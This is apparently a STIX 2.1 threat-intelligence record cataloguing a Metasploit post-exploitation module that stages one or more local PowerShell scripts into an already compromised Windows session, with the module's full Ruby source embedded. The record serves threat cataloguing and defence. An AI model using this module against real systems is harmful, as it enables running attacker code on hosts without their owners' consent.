{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9f429ae-4588-4f9a-928f-9d1a500ea313",
    "created": "2024-08-14T16:33:05.001718Z",
    "modified": "2024-08-14T16:33:05.001721Z",
    "name": "Load Scripts Into PowerShell Session",
    "description": " This module will download and execute one or more PowerShell scripts over a present powershell session. Setting VERBOSE to true will show the stager results.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['powershell']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/powershell/load_script.rb",
            "external_id": "load_script.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Load Scripts Into PowerShell Session',\n        'Description' => %q{\n          This module will download and execute one or more PowerShell scripts\n          over a present powershell session.\n          Setting VERBOSE to true will show the stager results.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['powershell'],\n        'Author' => [\n          'Ben Turner benpturner[at]yahoo.com',\n          'Dave Hardy davehardy20[at]gmail.com'\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('SCRIPT', [false, 'Path to the local PS script', ::File.join(Msf::Config.data_directory, 'post', 'powershell', 'msflag.ps1') ]),\n        OptPath.new('FOLDER', [false, 'Path to a local folder of PS scripts'])\n      ]\n    )\n  end\n\n  def run\n    if datastore['SCRIPT']\n      stage_psh_env(datastore['SCRIPT'])\n    end\n    if datastore['FOLDER']\n      files = ::Dir.entries(datastore['FOLDER'])\n      files.reject! { |u| %w[. ..].include?(u) }\n      files.each { |script| stage_psh_env(datastore['FOLDER'] + script) }\n    end\n  end\nend\n"
}